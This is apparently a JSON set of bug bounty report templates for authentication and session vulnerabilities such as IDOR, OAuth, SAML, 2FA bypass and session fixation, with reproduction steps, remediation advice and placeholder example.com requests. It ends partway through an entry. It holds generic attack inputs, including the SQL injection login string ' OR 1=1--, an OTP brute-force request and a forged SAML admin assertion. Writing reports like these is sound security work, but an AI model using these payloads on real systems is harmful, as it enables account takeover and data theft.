[
  {
    "vulnerability_name": "IDOR (Insecure Direct Object Reference)",
    "summary": "Insecure Direct Object Reference (IDOR) allows an unauthenticated/unauthorized user to access or manipulate sensitive data or functionality by modifying a parameter value that directly refers to a system object.",
    "severity": "High",
    "target": "[Specify affected asset, e.g., web.example.com]",
    "url_location": "[Full URL of the vulnerable endpoint, e.g., https://web.example.com/user/profile?id=123]",
    "steps_to_reproduce": [
      "1. Log in as [User A, e.g., a regular user].",
      "2. Navigate to [Affected feature/page, e.g., 'My Profile'].",
      "3. Observe the URL or request parameters. It contains a parameter like `id=123` or `userId=abc`.",
      "4. Log out or open a new browser/incognito window without authentication.",
      "5. Access the same URL or send the same request, but change the `[vulnerable parameter]` to `[another user's ID or an arbitrary ID, e.g., id=456]`.",
      "6. **[What happened]**: Observe that you can view/modify `[another user's data/object, e.g., User B's profile, User B's order details]`.",
      "7. **[What should happen]**: The application should have returned an 'Unauthorized' or 'Access Denied' error, or only allowed access to the logged-in user's data."
    ],
    "proof_of_concept": {
      "request_example": "GET /user/profile?id=456 HTTP/1.1\nHost: web.example.com\nCookie: sessionid=[your_session_id]",
      "response_example": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"id\": 456,\n  \"username\": \"victim_user\",\n  \"email\": \"victim@example.com\",\n  \"sensitive_data\": \"...\"\n}",
      "notes": "Attach screenshots or a video demonstrating the unauthorized access."
    },
    "impact": "An attacker can view, modify, or delete sensitive data belonging to other users or system objects, leading to privacy breaches, data manipulation, or even account takeovers in some scenarios.",
    "remediation_suggestion": "Implement proper authorization checks at the server-side for all requests accessing or manipulating objects. Ensure that the authenticated user is authorized to access the requested object, or use indirect object references that are mapped to the user's session on the server."
  },
  {
    "vulnerability_name": "OAUTH to Account takeover",
    "summary": "A misconfiguration or vulnerability in the OAuth implementation allows an attacker to bypass authentication and gain full control over a victim's account.",
    "severity": "Critical",
    "target": "[Specify affected asset, e.g., auth.example.com (OAuth provider) or app.example.com (client application)]",
    "url_location": "[Full URL of the OAuth authorization or callback endpoint, e.g., https://app.example.com/oauth/callback]",
    "steps_to_reproduce": [
      "1. **[Scenario A: Missing state parameter/CSRF]**",
      "   a. As an attacker, initiate the OAuth flow on `app.example.com` but intercept the authorization request to the OAuth provider (`auth.example.com`).",
      "   b. Remove or manipulate the `state` parameter (if present) from the authorization request URL.",
      "   c. Send this manipulated authorization URL to the victim.",
      "   d. The victim clicks the URL, authorizes the application, and is redirected back to `app.example.com`.",
      "   e. Since the `state` parameter was missing/incorrect, the application fails to validate the CSRF token.",
      "   f. **[What happened]**: The attacker's pre-initiated session is linked to the victim's OAuth authorization, leading to account takeover.",
      "   g. **[What should happen]**: The application should have validated the `state` parameter to prevent CSRF and ensure the authorization response belongs to the same user who initiated the request.",
      "2. **[Scenario B: Email/ID Mismatch]**",
      "   a. Register an account on `app.example.com` using `[Method 1, e.g., email/password]`.",
      "   b. Now, try to log in to `app.example.com` using the OAuth provider (`auth.example.com`) with a different OAuth account, but where the email address registered with `auth.example.com` matches the email address from step 'a'.",
      "   c. **[What happened]**: The application automatically links the OAuth account to the existing `app.example.com` account without further verification (e.g., password prompt, email verification of the OAuth account).",
      "   d. **[What should happen]**: The application should require additional verification (e.g., password, 2FA) when linking an existing account with an OAuth provider if the OAuth provider's email isn't already verified by the client application.",
      "3. **[Scenario C: Redirect URI bypass]**",
      "   a. Initiate the OAuth flow and capture the authorization request.",
      "   b. Modify the `redirect_uri` parameter to an attacker-controlled domain or a vulnerable endpoint on the legitimate domain (e.g., an Open Redirect).",
      "   c. **[What happened]**: The authorization code/token is sent to the attacker-controlled URL, allowing the attacker to exchange it for an access token and take over the victim's account.",
      "   d. **[What should happen]**: The `redirect_uri` should be strictly validated against a pre-registered whitelist of allowed URLs."
    ],
    "proof_of_concept": {
      "request_example": "GET /oauth/authorize?client_id=...&response_type=code&redirect_uri=...&scope=...&state=ATTACKER_STATE_HERE HTTP/1.1\nHost: auth.example.com",
      "notes": "Provide a video demonstrating the full account takeover, showing the attacker accessing the victim's account after exploiting the OAuth flow."
    },
    "impact": "Complete account takeover, allowing an attacker to access and control all user data and functionalities associated with the compromised account. This can lead to sensitive data exposure, financial loss, and reputation damage.",
    "remediation_suggestion": "Implement and strictly validate the `state` parameter to prevent CSRF attacks. Verify email ownership: When linking an OAuth account to an existing user account, ensure the email address provided by the OAuth provider is verified by the client application, or require a password confirmation. Strict `redirect_uri` validation: Whitelist and strictly validate all `redirect_uri`s to prevent token leakage to unauthorized domains. Force re-authentication: For sensitive actions, consider forcing users to re-authenticate, even if logged in via OAuth."
  },
  {
    "vulnerability_name": "SAML Attacks",
    "summary": "Vulnerability in the SAML (Security Assertion Markup Language) implementation allowing an attacker to bypass authentication, impersonate users, or access unauthorized resources.",
    "severity": "Critical",
    "target": "[Specify affected Service Provider (SP) or Identity Provider (IdP) e.g., app.example.com (SP) or idp.example.com (IdP)]",
    "url_location": "[Full URL of the SAML Assertion Consumer Service (ACS) endpoint, e.g., https://app.example.com/saml/acs]",
    "steps_to_reproduce": [
      "1. **[Scenario A: Signature Bypass/Removal]**",
      "   a. Capture a legitimate SAML response from the IdP.",
      "   b. Modify the SAML assertion (e.g., change the `NameID` to a different user's identifier).",
      "   c. Remove or tamper with the signature from the SAML response.",
      "   d. Replay the modified SAML response to the SP's ACS endpoint.",
      "   e. **[What happened]**: The SP accepts the unsigned/tampered assertion and logs the attacker in as the targeted user.",
      "   f. **[What should happen]**: The SP should strictly validate the digital signature of the SAML assertion and reject any unsigned or tampered assertions.",
      "2. **[Scenario B: XML Signature Wrapping]**",
      "   a. Capture a legitimate SAML response.",
      "   b. Embed a manipulated SAML assertion (e.g., with a different `NameID`) within the signed portion of the legitimate assertion, but also include the original valid assertion.",
      "   c. **[What happened]**: The SP's XML parser prioritizes the attacker's malicious assertion while still validating the original signature, leading to impersonation.",
      "   d. **[What should happen]**: The SP's XML parser should be robust enough to correctly identify and process only the intended signed portion of the SAML assertion.",
      "3. **[Scenario C: Assertion Replay]**",
      "   a. Capture a legitimate SAML assertion after a successful login.",
      "   b. Log out from the application.",
      "   c. Replay the captured SAML assertion to the ACS endpoint.",
      "   d. **[What happened]**: The SP accepts the replayed assertion and logs the attacker back in as the original user, even though the original session was terminated.",
      "   e. **[What should happen]**: The SP should implement a mechanism (e.g., `NotOnOrAfter` validation, nonce usage, or caching of used assertions) to prevent SAML assertion replay attacks."
    ],
    "proof_of_concept": {
      "request_example": "\n<samlp:Response ...>\n  <saml:Assertion ...>\n    <saml:Subject>\n      <saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\">admin</saml:NameID>\n      ...\n    </saml:Subject>\n    ...\n  </saml:Assertion>\n</samlp:Response>",
      "notes": "Provide screenshots or a video demonstrating the successful authentication bypass or impersonation."
    },
    "impact": "Authentication bypass, user impersonation, unauthorized access to sensitive data and functionalities, potentially leading to full account takeover or privilege escalation.",
    "remediation_suggestion": "Strict Signature Validation: Always validate the digital signature of the SAML assertion and ensure it's from a trusted IdP. Reject any unsigned or tampered assertions. Robust XML Parsing: Implement secure XML parsing mechanisms to prevent XML Signature Wrapping and other XML-related attacks. Assertion Replay Protection: Implement mechanisms to detect and prevent replay attacks, such as validating `NotOnOrAfter` and `NotBefore` conditions, or maintaining a list of used assertion IDs. Encryption of Sensitive Data: Encrypt sensitive attributes within the SAML assertion."
  },
  {
    "vulnerability_name": "2FA/OTP Bypass",
    "summary": "The two-factor authentication (2FA) or One-Time Password (OTP) mechanism can be bypassed, allowing an attacker to gain unauthorized access to an account with only the primary credentials (e.g., username/password).",
    "severity": "High",
    "target": "[Specify affected application/service, e.g., portal.example.com]",
    "url_location": "[Full URL of the 2FA/OTP verification page, e.g., https://portal.example.com/2fa/verify]",
    "steps_to_reproduce": [
      "1. **[Scenario A: OTP Reuse/No Expiration]**",
      "   a. Initiate a login attempt with a valid username and password.",
      "   b. An OTP is sent to the registered device/email.",
      "   c. Enter an incorrect OTP multiple times until the OTP is invalidated or account is locked (if applicable).",
      "   d. Request a new OTP.",
      "   e. Now, try using the *old*, already used/invalidated OTP.",
      "   f. **[What happened]**: The system accepts the old OTP, allowing login.",
      "   g. **[What should happen]**: Each OTP should be valid only once and for a limited time.",
      "2. **[Scenario B: OTP Brute-Force (Lack of Rate Limiting)]**",
      "   a. Initiate a login attempt with a valid username and password.",
      "   b. An OTP is sent.",
      "   c. Intercept the OTP verification request.",
      "   d. Brute-force the OTP parameter by iterating through all possible 6-digit (or common) OTPs.",
      "   e. **[What happened]**: After a few attempts (e.g., 100-200), a valid OTP is guessed, and the attacker gains access.",
      "   f. **[What should happen]**: There should be strong rate limiting on OTP verification attempts (e.g., 3-5 attempts before locking the account or blocking the IP).",
      "3. **[Scenario C: 2FA Bypass via Alternative Login Flow]**",
      "   a. Log in with valid username and password.",
      "   b. You are redirected to the 2FA verification page.",
      "   c. Instead of entering the OTP, try to access another part of the application directly (e.g., `https://portal.example.com/dashboard` or a mobile API endpoint).",
      "   d. **[What happened]**: The application allows access to sensitive functionalities without requiring 2FA verification.",
      "   e. **[What should happen]**: All sensitive functionalities and the main dashboard should be protected by 2FA if enabled.",
      "4. **[Scenario D: Client-Side Bypass]**",
      "   a. Log in with valid username and password.",
      "   b. You are redirected to the 2FA verification page.",
      "   c. Inspect the browser's developer tools. Look for hidden fields, JavaScript logic, or API calls that might indicate a bypass.",
      "   d. Manipulate client-side variables or disable JavaScript.",
      "   e. **[What happened]**: The client-side bypass allows proceeding without OTP verification.",
      "   f. **[What should happen]**: 2FA validation should be enforced server-side."
    ],
    "proof_of_concept": {
      "request_example": "POST /2fa/verify HTTP/1.1\nHost: portal.example.com\nCookie: sessionid=[session_id_after_password_auth]\nContent-Type: application/x-www-form-urlencoded\n\notp=000001\notp=000002\n...\notp=999999",
      "notes": "Provide a video demonstrating the successful bypass of 2FA and gaining access to the account."
    },
    "impact": "Compromise of user accounts, even with stolen primary credentials, leading to unauthorized access to sensitive information, financial transactions, or system resources. This significantly undermines the security posture.",
    "remediation_suggestion": "Server-Side OTP Validation: Ensure all OTP validation occurs strictly on the server-side. Strong Rate Limiting: Implement robust rate limiting on OTP verification attempts to prevent brute-force attacks. One-Time Use for OTPs: Each OTP should be valid for only one successful login attempt and should expire after a short period. Enforce 2FA consistently: Ensure all sensitive functionalities and endpoints are protected by 2FA once it is enabled for an account. Invalidate OTPs on new request: When a new OTP is generated, all previously sent OTPs for that user should be invalidated."
  },
  {
    "vulnerability_name": "Login Bypass",
    "summary": "An attacker can bypass the login mechanism to gain unauthorized access to the application or restricted areas without valid credentials.",
    "severity": "Critical",
    "target": "[Specify affected application/service, e.g., admin.example.com]",
    "url_location": "[Full URL of the login endpoint or restricted page, e.g., https://admin.example.com/login]",
    "steps_to_reproduce": [
      "1. **[Scenario A: SQL Injection in Credentials]**",
      "   a. Navigate to the login page.",
      "   b. In the username field, enter `' OR 1=1--` (or other SQLi payloads).",
      "   c. In the password field, enter `[anything, e.g., password]`.",
      "   d. **[What happened]**: The application logs you in as an administrator or the first user in the database.",
      "   e. **[What should happen]**: The application should properly sanitize user input and return an authentication failure.",
      "2. **[Scenario B: Weak Logic / Parameter Tampering]**",
      "   a. Navigate to the login page.",
      "   b. Try to access a restricted page directly, e.g., `https://admin.example.com/dashboard`. Observe you are redirected to login.",
      "   c. Attempt to log in with invalid credentials.",
      "   d. Intercept the login request and modify a parameter (e.g., change `isAdmin=false` to `isAdmin=true` in a hidden field, or manipulate a response cookie like `auth_token`).",
      "   e. **[What happened]**: The application grants access to the restricted area without valid authentication.",
      "   f. **[What should happen]**: The application should rely on server-side session management and robust authentication checks.",
      "3. **[Scenario C: Default/Hardcoded Credentials]**",
      "   a. Attempt to log in with common default credentials (e.g., `admin/admin`, `root/root`, `test/test`).",
      "   b. **[What happened]**: The system accepts the default credentials, granting unauthorized access.",
      "   c. **[What should happen]**: Default credentials should be changed or disabled before deployment.",
      "4. **[Scenario D: Authentication Token Manipulation / Predictable Tokens]**",
      "   a. Observe the structure of session tokens or authentication cookies after a partial login (e.g., pre-2FA).",
      "   b. Try to predict or forge a valid authentication token.",
      "   c. Set this forged token in your browser cookies and try to access restricted areas.",
      "   d. **[What happened]**: The forged token is accepted, bypassing login.",
      "   e. **[What should happen]**: Session tokens should be cryptographically strong, unpredictable, and securely generated/validated server-side."
    ],
    "proof_of_concept": {
      "request_example": "POST /login HTTP/1.1\nHost: admin.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=' OR 1=1--&password=anything",
      "notes": "Provide screenshots or a video demonstrating the successful login bypass and access to unauthorized areas."
    },
    "impact": "Complete compromise of the application, administrative access, sensitive data exposure, and potential for further exploitation (e.g., remote code execution if administrative panels are accessible).",
    "remediation_suggestion": "Input Validation and Parameterization: Implement strict input validation for all user-supplied data to prevent SQL injection and other injection attacks. Use parameterized queries. Server-Side Authentication: Enforce all authentication logic on the server-side. Never trust client-side parameters for authentication decisions. Secure Session Management: Generate strong, unpredictable, and sufficiently long session tokens. Regenerate session IDs after successful authentication. Disable Default Credentials: Ensure no default or hardcoded credentials are left enabled in production environments. Robust Error Handling: Avoid revealing too much information in error messages that could aid an attacker in bypassing login."
  },
  {
    "vulnerability_name": "Reset Forgotten Password Bypass",
    "summary": "A vulnerability in the password reset functionality allows an attacker to reset the password of arbitrary user accounts without proper authorization, leading to account takeover.",
    "severity": "Critical",
    "target": "[Specify affected application/service, e.g., accounts.example.com]",
    "url_location": "[Full URL of the password reset initiation or token verification endpoint, e.g., https://accounts.example.com/forgot_password]",
    "steps_to_reproduce": [
      "1. **[Scenario A: Host Header Injection / Email Poisoning]**",
      "   a. Initiate a password reset request for a victim's email address.",
      "   b. Intercept the request and modify the `Host` header to an attacker-controlled domain.",
      "   c. **[What happened]**: The password reset link sent to the victim's email contains the attacker-controlled domain, leading the victim to a phishing site or sending the reset token to the attacker's server if they click it.",
      "   d. **[What should happen]**: The application should strictly validate and whitelist the `Host` header or construct reset links using a fixed, hardcoded domain.",
      "2. **[Scenario B: Weak/Predictable Reset Token Generation]**",
      "   a. Initiate a password reset for your own account.",
      "   b. Note the password reset token generated.",
      "   c. Analyze the token for patterns (e.g., incremental numbers, timestamps, easily guessable values).",
      "   d. Initiate a password reset for a victim's account.",
      "   e. Based on the analysis, try to predict the victim's reset token.",
      "   f. Use the predicted token to reset the victim's password.",
      "   g. **[What happened]**: The attacker successfully resets the victim's password.",
      "   h. **[What should happen]**: Password reset tokens must be cryptographically strong, unique, and unpredictable.",
      "3. **[Scenario C: OTP/Token Brute-Force (Lack of Rate Limiting)]**",
      "   a. Initiate a password reset request for a victim's account.",
      "   b. An OTP/token is sent to the victim.",
      "   c. Intercept the OTP/token verification request.",
      "   d. Brute-force the OTP/token parameter.",
      "   e. **[What happened]**: After a few attempts, a valid OTP/token is guessed, allowing password reset.",
      "   f. **[What should happen]**: Strong rate limiting should be applied to password reset token verification attempts.",
      "4. **[Scenario D: Session Fixation after Password Reset]**",
      "   a. User A initiates a password reset and receives a reset link.",
      "   b. Before User A resets the password, User B (attacker) somehow obtains User A's session ID (e.g., via XSS or a previously fixed session).",
      "   c. User A successfully resets their password using the reset link.",
      "   d. **[What happened]**: The attacker (User B) can still use the old session ID to access User A's account after the password reset.",
      "   e. **[What should happen]**: The application should invalidate all existing sessions for a user after a password reset."
    ],
    "proof_of_concept": {
      "request_example": "POST /reset_password_verify HTTP/1.1\nHost: accounts.example.com\nContent-Type: application/x-www-form-urlencoded\n\ntoken=PREDICTED_VICTIM_TOKEN&new_password=attacker_password",
      "notes": "Provide screenshots or a video demonstrating the successful password reset and subsequent account takeover."
    },
    "impact": "Complete account takeover of any user, leading to unauthorized access to sensitive data, financial loss, and reputational damage for both the user and the organization.",
    "remediation_suggestion": "Strict Host Header Validation: Ensure the `Host` header is validated and only allowed domains are used for constructing password reset links. Strong, Unique, and Time-Limited Tokens: Generate cryptographically strong, unique, and short-lived password reset tokens. Robust Rate Limiting: Implement strong rate limiting on password reset initiation and token verification attempts. Invalidate Existing Sessions: After a successful password reset, all active sessions for that user should be invalidated to prevent session fixation. Secure Token Storage: Ensure password reset tokens are not stored in easily accessible client-side locations (e.g., local storage, URL parameters after initial use)."
  },
  {
    "vulnerability_name": "Registration Vulnerabilities",
    "summary": "Flaws in the user registration process allow attackers to create unauthorized accounts, bypass verification, or enumerate existing users.",
    "severity": "Medium",
    "target": "[Specify affected application/service, e.g., app.example.com]",
    "url_location": "[Full URL of the registration endpoint, e.g., https://app.example.com/register]",
    "steps_to_reproduce": [
      "1. **[Scenario A: Username/Email Enumeration]**",
      "   a. Go to the registration page.",
      "   b. Attempt to register with a common username or email (e.g., `admin@example.com`, `test@example.com`).",
      "   c. **[What happened]**: The error message explicitly states 'Username already exists' or 'Email already registered.'",
      "   d. **[What should happen]**: The error message should be generic, e.g., 'Registration failed. Please try again.' or 'If the provided email is valid, you will receive a confirmation link.'",
      "2. **[Scenario B: Missing Email Verification Bypass]**",
      "   a. Register a new account with an attacker-controlled email address.",
      "   b. During the registration process, observe if the application sends a verification email.",
      "   c. If a verification email is sent, try to bypass the verification step (e.g., by directly accessing logged-in areas, manipulating HTTP requests/responses to set a 'verified' flag, or using a known-good email from a different account).",
      "   d. **[What happened]**: The attacker successfully creates an account without verifying the email address, allowing access using an unverified email.",
      "   e. **[What should happen]**: Email verification should be strictly enforced before granting full account access.",
      "3. **[Scenario C: Rate Limiting on Registration]**",
      "   a. Automate multiple registration requests using a tool like Burp Suite Intruder or a script.",
      "   b. Use different email addresses and usernames for each attempt.",
      "   c. **[What happened]**: The application allows unlimited registration attempts, potentially leading to resource exhaustion or spam.",
      "   d. **[What should happen]**: Strong rate limiting should be applied to the registration endpoint to prevent automated sign-ups and denial-of-service.",
      "4. **[Scenario D: Weak Password Policy Enforcement]**",
      "   a. During registration, attempt to set a very weak password (e.g., `123456`, `password`, or empty).",
      "   b. **[What happened]**: The application allows the registration with the weak password.",
      "   c. **[What should happen]**: The application should enforce a strong password policy (minimum length, complexity requirements)."
    ],
    "proof_of_concept": {
      "request_example": "POST /register HTTP/1.1\nHost: app.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&email=admin@example.com&password=password123",
      "response_example": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"status\": \"error\",\n  \"message\": \"Username 'admin' already exists.\"\n}",
      "notes": "Provide screenshots or a video demonstrating the enumeration or bypass."
    },
    "impact": "User Enumeration: Allows attackers to identify valid usernames/emails, which can then be used for credential stuffing or targeted phishing attacks. Resource Exhaustion/Spam: Unlimited registrations can lead to database bloat, sending of numerous emails, or other DoS vectors. Weak Account Security: Users might create accounts with easily guessable passwords, making them vulnerable.",
    "remediation_suggestion": "Generic Error Messages: Provide generic error messages for registration attempts to prevent user enumeration. Robust Email Verification: Strictly enforce email verification for newly registered accounts. Rate Limiting: Implement strong rate limiting on the registration endpoint. Strong Password Policy: Enforce a robust password policy during registration. CAPTCHA/reCAPTCHA: Implement CAPTCHA or reCAPTCHA to mitigate automated registration attempts."
  },
  {
    "vulnerability_name": "Session Fixation",
    "summary": "The application fails to issue a new session ID after successful authentication, allowing an attacker to 'fix' a user's session ID and then hijack their authenticated session.",
    "severity": "Medium",
    "target": "[Specify affected application/service, e.g., app.example.com]",
    "url_location": "[Full URL of the login endpoint or any page that accepts a session ID parameter, e.g., https://app.example.com/login]",
    "steps_to_reproduce": [
      "1. **[Scenario A: URL Parameter]**",
      "   a. As an attacker, visit `https://app.example.com/login?JSESSIONID=ATTACKER_SESSION_ID`. The application issues a session with `ATTACKER_SESSION_ID`.",
      "   b. Send this crafted URL to the victim.",
      "   c. The victim clicks the URL and logs in with their credentials.",
      "   d. **[What happened]**: After successful login, the application continues to use `ATTACKER_SESSION_ID` for the victim's authenticated session.",
      "   e. **[What should happen]**: The application should have generated a *new* session ID after successful authentication.",
      "   f. The attacker, using the `ATTACKER_SESSION_ID` (which is now associated with the victim's authenticated session), can access the victim's account.",
      "2. **[Scenario B: Cookie Manipulation]**",
      "   a. As an attacker, visit `https://app.example.com/`. The application issues a session cookie (e.g., `JSESSIONID=ATTACKER_SESSION_ID`).",
      "   b. Send this `ATTACKER_SESSION_ID` to the victim (e.g., via XSS vulnerability, if present, or by tricking the victim to set the cookie).",
      "   c. The victim logs in with their credentials while having the fixed `ATTACKER_SESSION_ID` cookie.",
      "   d. **[What happened]**: The application continues to use `ATTACKER_SESSION_ID` for the victim's authenticated session.",
      "   e. **[What should happen]**: The application should have generated a *new* session ID after successful authentication.",
      "   f. The attacker, still possessing the `ATTACKER_SESSION_ID`, can now access the victim's authenticated session."
    ],
    "proof_of_concept": {
      "notes": "Before Login (Attacker): Attacker sets a cookie `JSESSIONID=FIXED_SESSION_ID` or navigates to `https://app.example.com/login?JSESSIONID=FIXED_SESSION_ID`. The server creates a session with this ID. During Login (Victim): Victim logs in, using the `FIXED_SESSION_ID` (either from URL or attacker-set cookie). After Login (Victim's browser cookies): Still shows `JSESSIONID=FIXED_SESSION_ID`. After Login (Attacker's browser cookies): Attacker uses the same `FIXED_SESSION_ID` to access the victim's account. Provide screenshots or a video demonstrating that the fixed session ID persists after authentication and can be used by the attacker."
    },
    "impact": "Session hijacking, allowing an attacker to impersonate the victim and access sensitive information or perform actions on their behalf. This can lead to account compromise, data theft, and financial fraud.",
    "remediation_suggestion": "Regenerate Session ID on Authentication: The most effective countermeasure is to always generate a brand new session ID after a user successfully authenticates. This ensures that any pre-authentication session ID provided by an attacker is no longer valid. Invalidate Old Session IDs: Ensure that the old (pre-authentication) session ID is completely invalidated on the server-side. Avoid Session IDs in URL: Do not accept session IDs directly from URL parameters, as this makes session fixation much easier."
  },
  {
    "vulnerability_name": "Session Expiration Issues",
    "summary": "Inadequate session expiration policies or improper session termination mechanisms allow authenticated sessions to remain valid for an excessive period, increasing the risk of session hijacking or unauthorized access if a session token is compromised.",
    "severity": "Medium",
    "target": "[Specify affected application/service, e.g., secure.example.com]",
    "url_location": "[Any authenticated page, e.g., https://secure.example.com/dashboard]",
    "steps_to_reproduce": [
      "1. **[Scenario A: Infinite Session Duration]**",
      "   a. Log in to the application.",
      "   b. Close the browser without explicitly logging out.",
      "   c. Wait for a prolonged period (e.g., several hours, days, or even weeks).",
      "   d. Reopen the browser and navigate to the application's URL.",
      "   e. **[What happened]**: You are still logged in without needing to re-authenticate.",
      "   f. **[What should happen]**: Sessions should have a reasonable inactivity timeout (e.g., 15-30 minutes) and an absolute timeout (e.g., 8-24 hours).",
      "2. **[Scenario B: Inactivity Timeout Not Enforced]**",
      "   a. Log in to the application.",
      "   b. Keep the browser open but remain inactive on the application for a period longer than the expected session timeout (e.g., leave it open overnight).",
      "   c. Attempt to perform an action on the application.",
      "   d. **[What happened]**: The session remains active, and you can continue using the application.",
      "   e. **[What should happen]**: The application should automatically log out the user after a period of inactivity.",
      "3. **[Scenario C: Logout Functionality Flaw (Session Not Invalidated)]**",
      "   a. Log in to the application.",
      "   b. Note the session ID (e.g., from browser cookies).",
      "   c. Click 'Logout.'",
      "   d. In a new browser tab or using a tool like Burp Suite Repeater, attempt to use the previously noted session ID to access an authenticated page.",
      "   e. **[What happened]**: The application accepts the old session ID, and you regain access to the authenticated session despite logging out.",
      "   f. **[What should happen]**: The application should invalidate the session on the server-side when the user logs out."
    ],
    "proof_of_concept": {
      "request_example": "GET /dashboard HTTP/1.1\nHost: secure.example.com\nCookie: sessionid=[OLD_SESSION_ID_FROM_BEFORE_LOGOUT]",
      "response_example": "HTTP/1.1 200 OK\nContent-Type: text/html\n\n",
      "notes": "Provide screenshots or a video demonstrating that the session remains active after a long period of inactivity or after explicit logout."
    },
    "impact": "Increased risk of session hijacking if a session token is stolen (e.g., via XSS, network sniffing, or compromise of user's device). This can lead to unauthorized access to the user's account and sensitive data.",
    "remediation_suggestion": "Implement Strict Session Timeouts: Inactivity Timeout: Automatically log out users after a reasonable period of inactivity (e.g., 15-30 minutes). Absolute Timeout: Force re-authentication after a longer absolute period (e.g., 8-24 hours), regardless of activity. Server-Side Session Invalidation on Logout: Ensure that when a user logs out, their session is explicitly invalidated on the server-side, not just deleted from the client's browser. Secure Cookie Attributes: Use `HttpOnly` and `Secure` flags for session cookies to mitigate XSS-based session theft and ensure cookies are only sent over HTTPS."
  },
  {
    "vulnerability_name": "Username/Email Enumeration",
    "summary": "The application reveals information about the existence of usernames or email addresses through differing error messages or responses, allowing an attacker to enumerate valid user accounts.",
    "severity": "Low",
    "target": "[Specify affected application/service, e.g., api.example.com or auth.example.com]",
    "url_location": "[Full URL of the login, registration, or password reset endpoint, e.g., https://auth.example.com/login]",
    "steps_to_reproduce": [
      "1. **[Scenario A: Login Page]**",
      "   a. Go to the login page.",
      "   b. Attempt to log in with a valid username and an incorrect password.",
      "   c. **[What happened]**: The error message states: 'Incorrect password.'",
      "   d. Attempt to log in with an invalid username (one that doesn't exist) and any password.",
      "   e. **[What happened]**: The error message states: 'Username not found' or 'Account does not exist.'",
      "   f. **[What should happen]**: Both cases should return a generic error message like 'Invalid username or password.'",
      "2. **[Scenario B: Password Reset Page]**",
      "   a. Go to the 'Forgot Password' or 'Reset Password' page.",
      "   b. Enter a valid email address.",
      "   c. **[What happened]**: The response states: 'A password reset link has been sent to your email.'",
      "   d. Enter an invalid email address (one that doesn't exist).",
      "   e. **[What happened]**: The response states: 'Email address not found' or 'No account associated with this email.'",
      "   f. **[What should happen]**: Both cases should return a generic message like 'If an account exists with the provided email, a password reset link will be sent.'",
      "3. **[Scenario C: Registration Page (if applicable)]**",
      "   a. Go to the registration page.",
      "   b. Try to register with an email address that is already registered.",
      "   c. **[What happened]**: The error message explicitly states: 'This email is already registered.'",
      "   d. **[What should happen]**: The error message should be generic, e.g., 'Registration failed. Please try again.' or 'If this email is valid, you will receive a confirmation link.'",
      "4. **[Scenario D: Timing Differences]**",
      "   a. On the login or password reset page, send a request with a valid username/email and another with an invalid one.",
      "   b. Measure the response time for each request.",
      "   c. **[What happened]**: There's a significant difference in response times (e.g., valid credentials take longer to process due to database lookups).",
      "   d. **[What should happen]**: The application should ensure similar response times for valid and invalid inputs to prevent timing-based enumeration."
    ],
    "proof_of_concept": {
      "request_example": "POST /login HTTP/1.1\nHost: auth.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=victim_user&password=wrongpassword\n\n---\n\nPOST /login HTTP/1.1\nHost: auth.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=non_existent_user&password=anypassword",
      "response_example": "Valid User Response: `{\"status\": \"error\", \"message\": \"Incorrect password.\"}`\nInvalid User Response: `{\"status\": \"error\", \"message\": \"Username not found.\"}`",
      "notes": "Provide screenshots of the differing error messages or a graph/table of timing differences."
    },
    "impact": "Credential Stuffing: Valid usernames/emails can be used in credential stuffing attacks where attackers try combinations of compromised passwords from other breaches. Targeted Phishing/Social Engineering: Knowledge of valid accounts makes it easier for attackers to craft convincing phishing emails or social engineering attempts. Brute-Force Attacks: Narrows down the target pool for password brute-force attacks.",
    "remediation_suggestion": "Generic Error Messages: Implement generic error messages for authentication and password reset attempts, providing the same message for both valid and invalid inputs (e.g., 'Invalid username or password' or 'If an account exists, instructions have been sent to the associated email.'). Mitigate Timing Attacks: Add artificial delays or process valid and invalid inputs similarly to minimize timing differences. Rate Limiting: Implement strong rate limiting on all authentication-related endpoints to prevent automated enumeration attempts."
  },
  {
    "vulnerability_name": "Weak Password Policy",
    "summary": "The application allows users to set weak or easily guessable passwords, making accounts vulnerable to brute-force, dictionary, or credential stuffing attacks.",
    "severity": "Low",
    "target": "[Specify affected application/service, e.g., auth.example.com]",
    "url_location": "[Full URL of the registration or password change endpoint, e.g., https://auth.example.com/register or https://auth.example.com/profile/change_password]",
    "steps_to_reproduce": [
      "1. Navigate to the user registration page or the 'Change Password' section within an authenticated session.",
      "2. Attempt to set a password that is commonly considered weak, such as:",
      "   - Too short (e.g., `123`, `abc`)",
      "   - Common dictionary words (e.g., `password`, `qwerty`)",
      "   - Simple numeric or alphanumeric sequences (e.g., `123456`, `abcdefg`)",
      "   - Based on username/email (e.g., if username is 'john.doe', try 'john.doe')",
      "   - Empty password (if allowed by the UI).",
      "3. **[What happened]**: The application accepts the weak password without any error, warning, or enforcement of complexity rules.",
      "4. **[What should happen]**: The application should reject the weak password and provide clear feedback on the policy requirements (e.g., 'Password must be at least 8 characters long, include a number and a special character.')."
    ],
    "proof_of_concept": {
      "request_example": "POST /register HTTP/1.1\nHost: auth.example.com\nContent-Type: application/x-www-form-urlencoded\n\nusername=testuser&email=test@example.com&password=password",
      "response_example": "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"status\": \"success\",\n  \"message\": \"Account created successfully.\"\n}",
      "notes": "Attach a screenshot showing the successful registration/password change with a weak password, and if possible, a screenshot of any password policy displayed (or lack thereof)."
    },
    "impact": "Accounts using weak passwords are highly susceptible to brute-force attacks, dictionary attacks, and credential stuffing. This can lead to unauthorized account access, sensitive data exposure, and further compromise.",
    "remediation_suggestion": "Enforce a strong password policy requiring a minimum length, combination of character types (uppercase, lowercase, numbers, special characters), and disallowing common patterns or dictionary words. Implement client-side and server-side validation. Consider using a password strength meter during registration/change. Implement Troy Hunt's 'Pwned Passwords' API to prevent known compromised passwords from being used."
  },
  {
    "vulnerability_name": "Unverified Email or Phone Use",
    "summary": "The application allows critical actions or access to sensitive features using an unverified email address or phone number, potentially leading to unauthorized access, spam, or account takeover.",
    "severity": "Medium",
    "target": "[Specify affected application/service, e.g., app.example.com]",
    "url_location": "[Relevant endpoints for profile updates, purchases, or account settings, e.g., https://app.example.com/settings/email]",
    "steps_to_reproduce": [
